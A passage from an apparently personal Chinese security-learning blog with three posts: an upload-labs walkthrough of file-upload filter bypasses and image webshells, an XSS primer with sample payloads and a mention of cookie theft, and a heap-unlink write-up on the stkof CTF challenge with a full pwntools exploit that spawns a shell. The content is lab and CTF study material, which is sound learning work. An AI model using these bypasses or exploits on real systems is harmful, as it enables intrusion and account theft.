<p>if (file_exists(UPLOAD_PATH)) {<br>        $deny_ext = array(“.php”,”.php5”,”.php4”,”.php3”,”.php2”,”.html”,”.htm”,”.phtml”,”.pht”,”.pHp”,”.pHp5”,”.pHp4”,”.pHp3”,”.pHp2”,”.Html”,”.Htm”,”.pHtml”,”.jsp”,”.jspa”,”.jspx”,”.jsw”,”.jsv”,”.jspf”,”.jtml”,”.jSp”,”.jSpx”,”.jSpa”,”.jSw”,”.jSv”,”.jSpf”,”.jHtml”,”.asp”,”.aspx”,”.asa”,”.asax”,”.ascx”,”.ashx”,”.asmx”,”.cer”,”.aSp”,”.aSpx”,”.aSa”,”.aSax”,”.aScx”,”.aShx”,”.aSmx”,”.cEr”,”.sWf”,”.swf”,”.htaccess”);<br>        $file_name = trim($_FILES[‘upload_file’][‘name’]);<br>        $file_name = deldot($file_name);//删除文件名末尾的点<br>        $file_ext = strrchr($file_name, ‘.’);<br>        $file_ext = strtolower($file_ext); //转换为小写<br>        $file_ext = str_ireplace(‘::$DATA’, ‘’, $file_ext);//去除字符串::$DATA<br>        $file_ext = trim($file_ext); //首尾去空</p>
<p>比起上面的，都进行了过滤和限制，但是存在逻辑漏洞</p>
<p>当我们构造一个 phpinfo.php. .的文件时</p>
<p>phpinfo.php. .　　–删除文件名末尾的点–&gt;phpinfo.php. </p>
<p>phpinfo.php. 　　 ——转换为小写———-&gt;phpinfo.php. </p>
<p>phpinfo.php. 　　 —去除字符串::$DATA–&gt;phpinfo.php. </p>
<p>phpinfo.php. 　　 ——-首尾去空————&gt;phpinfo.php.</p>
<p>phpinfo.php.　　  –后缀没有在黑名单中—&gt;成功上传—–&gt;解析时默认删除末尾的 . —&gt;最终等价于上传了phpinfo.php文件</p>
<p><img src="https://s2.loli.net/2022/03/24/UoPEfYyx1uiXr2t.gif"></p>
<h2 id="upload-lab-10"><a href="#upload-lab-10" class="headerlink" title="upload-lab-10"></a>upload-lab-10</h2><p>上传 10.pphphp 文件</p>
<p>后端黑名单中包含 ‘php’ , 会将php替换为空 , 但只替换一次 , 替换后的文件名为 10.php , 仍然可以正常使用</p>
<p><img src="https://s2.loli.net/2022/03/24/JngtwYSZAed5xEP.gif"></p>
<h2 id="upload-lab-11"><a href="#upload-lab-11" class="headerlink" title="upload-lab-11"></a>upload-lab-11</h2><p>%00截断</p>
<p>.pphphp</p>
<p>都不对，气死了</p>
<h2 id="upload-lab-12"><a href="#upload-lab-12" class="headerlink" title="upload-lab-12"></a>upload-lab-12</h2><p>利用%00url截断绕过</p>
<p><img src="https://s2.loli.net/2022/03/24/lHAomEN7pGrQ5ea.gif"></p>
<h2 id="upload-lab-13"><a href="#upload-lab-13" class="headerlink" title="upload-lab-13"></a>upload-lab-13</h2><p>也是利用%00url截断绕过，但是环境问题无法验证，需要低版本的php</p>
<h2 id="upload-lab-14"><a href="#upload-lab-14" class="headerlink" title="upload-lab-14"></a>upload-lab-14</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42702981/article/details/118652121">制作图片木马https://blog.csdn.net/qq_42702981/article/details/118652121</a></p>
<p>存在文件包含漏洞</p>
<pre><code>&lt;?php
/*
本页面存在文件包含漏洞，用于测试图片马是否能正常运行！
*/
header(&quot;Content-Type:text/html;charset=utf-8&quot;);
$file = $_GET[&#39;file&#39;];
if(isset($file))&#123;
    include $file;
&#125;else&#123;
    show_source(__file__);
&#125;
?&gt;</code></pre>
<p>判断了是否为图片</p>
<pre><code>function isImage($filename)&#123;
    $types = &#39;.jpeg|.png|.gif&#39;;
    if(file_exists($filename))&#123;
        $info = getimagesize($filename);
        $ext = image_type_to_extension($info[2]);
        if(stripos($types,$ext))&#123;
            return $ext;
        &#125;else&#123;
            return false;
        &#125;
    &#125;else&#123;
        return false;
    &#125;
&#125;</code></pre>
<p>上传带有木马的jpg文件，通过文件包含漏洞执行</p>
<h2 id="upload-lab-15"><a href="#upload-lab-15" class="headerlink" title="upload-lab-15"></a>upload-lab-15</h2><p>与14相同</p>
<h2 id="upload-lab-16"><a href="#upload-lab-16" class="headerlink" title="upload-lab-16"></a>upload-lab-16</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u014029795/article/details/102908114">https://blog.csdn.net/u014029795/article/details/102908114</a></p>
<p>存在二次渲染，需要手动寻找未被修改的位置，写入payload.</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u014029795/article/details/102908114">https://blog.csdn.net/u014029795/article/details/102908114</a></p>
<h2 id="upload-lab-17"><a href="#upload-lab-17" class="headerlink" title="upload-lab-17"></a>upload-lab-17</h2><p>条件竞争</p>
<p>通过不断发包从而达到效果，可以通过burp进行爆破</p>
<p><a target="_blank" rel="noopener" href="https://www.fujieace.com/penetration-test/upload-labs-pass-17.html">https://www.fujieace.com/penetration-test/upload-labs-pass-17.html</a></p>
<h2 id="upload-lab-18"><a href="#upload-lab-18" class="headerlink" title="upload-lab-18"></a>upload-lab-18</h2><p>和17 相同</p>
<h2 id="upload-lab-19"><a href="#upload-lab-19" class="headerlink" title="upload-lab-19"></a>upload-lab-19</h2>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/03/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" data-id="cl0ta9sx1000f9sv8ht6u2ftr" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-xss" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/03/16/xss/" class="article-date">
  <time datetime="2022-03-16T08:09:29.973Z" itemprop="datePublished">2022-03-16</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2022/03/16/xss/">Web学习  XSS 跨站漏洞</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="XSS-跨站漏洞"><a href="#XSS-跨站漏洞" class="headerlink" title="XSS 跨站漏洞"></a>XSS 跨站漏洞</h1><h2 id="XSS简介"><a href="#XSS简介" class="headerlink" title="XSS简介"></a>XSS简介</h2><script>alert('xss')</script>

<p>跨站脚本攻击是指恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。</p>
<p>攻击者利用XSS漏洞旁路掉访问控制——例如同源策略(same origin policy)。这种类型的漏洞由于被黑客用来编写危害性更大的网络钓鱼(Phishing)攻击而变得广为人知。对于跨站脚本攻击，黑客界共识是：跨站脚本攻击是新型的“缓冲区溢出攻击“，而JavaScript是新型的“ShellCode”。</p>
<p>xss漏洞通常是通过php的输出函数将javascript代码输出到html页面中，通过用户本地浏览器执行的，所以xss漏洞关键就是寻找参数未过滤的输出函数。</p>
<h2 id="产生层面"><a href="#产生层面" class="headerlink" title="产生层面"></a>产生层面</h2><p>产生层面一般都是在前端，JavaScript代码能干什么，执行之后就会达到相应的效果</p>
<h2 id="函数类"><a href="#函数类" class="headerlink" title="函数类"></a>函数类</h2><p>比如说php中的脚本的输出函数</p>
<p>常见的输出函数有：print、print_r、echo、printf、sprintf、die、var_dump、var_export</p>
<p>XSS 跨站漏洞分类：</p>
<ol>
<li><p>反射型<br>&lt;非持久化&gt; 攻击者事先制作好攻击链接, 需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。<br>发包 x=xiaodi =&gt; x.php =&gt; 回包</p>
</li>
<li><p>储存型<br>&lt;持久化&gt; 代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行，这种XSS非常危险，容易造成蠕虫，大量盗窃cookie（虽然还有种DOM型XSS，但是也还是包括在存储型XSS内）。<br>发包 x=xiaodi =&gt; x.php =&gt; 写道数据库某个表 =&gt; x.php =&gt;回显</p>
</li>
<li><p>DOM型<br>基于文档对象模型Document Objeet Model，DOM)的一种漏洞。DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。DOM中有很多对象，其中一些是用户可以操纵的，如uRI ，location，refelTer等。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM XSS漏洞。<br>发包 x=xiaodi =&gt; 本地浏览器静态前端代码 =x.php</p>
<p> ‘ onclick=”alert(2)”&gt;</p>
</li>
</ol>
<p><img src="https://s2.loli.net/2022/03/20/sVX35oTxpwF6vDR.png"></p>
<p>利用xss平台可以盗取cookie</p>
<p><a target="_blank" rel="noopener" href="https://xssaq.com/xss.php?do=project&amp;act=viewcode&amp;ty=create&amp;id=12491">https://xssaq.com/xss.php?do=project&amp;act=viewcode&amp;ty=create&amp;id=12491</a></p>
<p>也可以通过向自己搭建的网站发送cookie</p>
<p>上传代码<br><img src="https://s2.loli.net/2022/03/20/VKsu9ZW2fzeotgj.png"></p>
<p>本地网站<br><img src="https://s2.loli.net/2022/03/20/7NqSFuhBUlTYswJ.png"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/03/16/xss/" data-id="cl0ta9sx0000d9sv8aa8rfm4g" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-unlink" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/01/23/unlink/" class="article-date">
  <time datetime="2022-01-23T13:50:01.673Z" itemprop="datePublished">2022-01-23</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2022/01/23/unlink/">unlink</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>今天复习一下unlink的原理及触发方式，这里主要2.29之前的方法，之后的利用写在off_by_none中。</p>
<p>unlink在合并堆块时，会将被合并的堆块从bin链中取出之后的链将变成FD-&gt;bk = BK ; BK-&gt;fd = FD , 可以利用这种机制在特定的地址处写入堆块（需要满足FD-&gt;bk == p ; BK-&gt;fd ==p）</p>
<p>以2014 HITCON stkof作为例题演示</p>
<p>在edit中写入的size是可控的，所以存在溢出漏洞</p>
<p><img src="https://s2.loli.net/2022/01/23/AHMIYEC2BWszcJy.png"></p>
<p>可以发现chunk的地址被存储在了这个地址head，可以通过伪造chunk及其fd,bk从而将chunk写入该位置。</p>
<p>申请三个堆，用于unlink的堆块不可进入fastbin否则无法触发unlink</p>
<p><img src="https://s2.loli.net/2022/01/23/smhTbauCo85MdlS.png"></p>
<p>伪造fackchunk 其fd = head-0x8 ; bk = head,注意其下一chunk的prevsize 和 inuse都需要修改使其认为fakechunk是其上一chunk.</p>
<p>free造成unlink,FD-bk = BK ; BK-&gt;fd = FD (如图)</p>
<p><img src="https://s2.loli.net/2022/01/23/Ai7fJtnVmdIMpKR.png"></p>
<pre><code>ad(0x20)
ad(0x30)
ad(0x80) #must be smallbin

head = 0x0602140
payload = p64(0) + p64(0x20) + p64(head - 0x8) + p64(head) + p64(0) + p64(0) + p64(0x30) + p64(0x90) # make it believe that prev chunk is at fakechunk
md(2,len(payload),payload)
#gdb.attach(io)
rm(3)</code></pre>
<p>之后可以通过编辑chunk2来leak.将free_got , puts_got , atoi_got 分别填入chunk中，再次编辑将free_got中写入puts_plt，这样调用free可以泄露地址。</p>
<p><img src="https://s2.loli.net/2022/01/23/E1lDqKQ53wtRxW8.png"></p>
<pre><code>payload = b&#39;a&#39; * 8 + p64(elf.got[&#39;free&#39;]) + p64(elf.got[&#39;puts&#39;]) + p64(elf.got[&#39;atoi&#39;])
md(2,len(payload),payload)
#gdb.attach(io)

payload = p64(elf.plt[&#39;puts&#39;])
md(0,len(payload),payload)
rm(1)
puts_addr = io.recvuntil(&#39;\nOK\n&#39;, drop=True).ljust(8, b&#39;\x00&#39;)
puts_addr = u64(puts_addr)
log.success(&#39;puts addr: &#39; + hex(puts_addr))
base = puts_addr - libc.sym[&#39;puts&#39;]
binsh = base + libc.search(b&quot;/bin/sh&quot;).__next__()
system = base + libc.sym[&#39;system&#39;]</code></pre>
<p>最后想atoi_got中写入system,传入bin_sh的参数即可getshell</p>
<pre><code>li(&quot;system---&gt;&quot;+hex(system))
md(2,len(p64(system)),p64(system))

io.sendline(p64(binsh))</code></pre>
<p>完整exp如下：</p>
<pre><code>#! /usr/bin/python3
#-*- coding:utf-8 -*-
from pwn import *
import os
r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info(&#39;\x1b[01;38;5;214m&#39; + x + &#39;\x1b[0m&#39;)

#------------------------------------------------

io = process(&#39;./stkof&#39;)

context.log_level=&#39;debug&#39;

elf = ELF(&#39;./stkof&#39;)

libc = elf.libc

context.log_level = &#39;debug&#39;
#------------------------------------------------

def ad(size):
    io.sendline(&#39;1&#39;)
    io.sendline(str(size))
    io.recvuntil(&#39;OK\n&#39;)


def md(idx, size, content):
    io.sendline(&#39;2&#39;)
    io.sendline(str(idx))
    io.sendline(str(size))
    io.send(content)
    io.recvuntil(&#39;OK\n&#39;)


def rm(idx):
    io.sendline(&#39;3&#39;)
    io.sendline(str(idx))

def finish():
    io.interactive()


def exploit():
    ad(0x20)
    ad(0x30)
    ad(0x80) #must be smallbin

    head = 0x0602140
    payload = p64(0) + p64(0x20) + p64(head - 0x8) + p64(head) + p64(0) + p64(0) + p64(0x30) + p64(0x90) # make it believe that prev chunk is at fakechunk
    md(2,len(payload),payload)

    rm(3)
    gdb.attach(io)
    io.recvuntil(&#39;OK\n&#39;)
    payload = b&#39;a&#39; * 8 + p64(elf.got[&#39;free&#39;]) + p64(elf.got[&#39;puts&#39;]) + p64(elf.got[&#39;atoi&#39;])
    md(2,len(payload),payload)
    #gdb.attach(io)

    payload = p64(elf.plt[&#39;puts&#39;])
    md(0,len(payload),payload)
    rm(1)
    puts_addr = io.recvuntil(&#39;\nOK\n&#39;, drop=True).ljust(8, b&#39;\x00&#39;)
    puts_addr = u64(puts_addr)
    log.success(&#39;puts addr: &#39; + hex(puts_addr))
    base = puts_addr - libc.sym[&#39;puts&#39;]
    binsh = base + libc.search(b&quot;/bin/sh&quot;).__next__()
    system = base + libc.sym[&#39;system&#39;]

    li(&quot;system---&gt;&quot;+hex(system))
    md(2,len(p64(system)),p64(system))

    io.sendline(p64(binsh))

#-------------------------------start

if __name__ == &#39;__main__&#39;:
    exploit()
    finish()</code></pre>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/01/23/unlink/" data-id="cl0ta9sx0000c9sv8bufxabs3" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">April 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">March 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">November 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2022/08/10/22.8.10xctf-pwn&re/">(no title)</a>
          </li>
        
          <li>
            <a href="/2022/04/07/%E8%BF%9C%E6%8E%A7ghost/">记第一个GitHub项目 --ghost远控</a>
          </li>
        
          <li>
            <a href="/2022/03/21/BUUCTF%E7%AC%AC%E4%BA%8C%E9%A1%B5/">buuctf&amp;&amp;攻防世界</a>
          </li>
        
          <li>
            <a href="/2022/03/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">Web学习 文件包含漏洞</a>
          </li>
        
          <li>
            <a href="/2022/03/16/tcathe_%E4%BF%AE%E6%94%B9fd/">tcache结构体</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2022 John Doe<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>




  </div>
</body>
</html>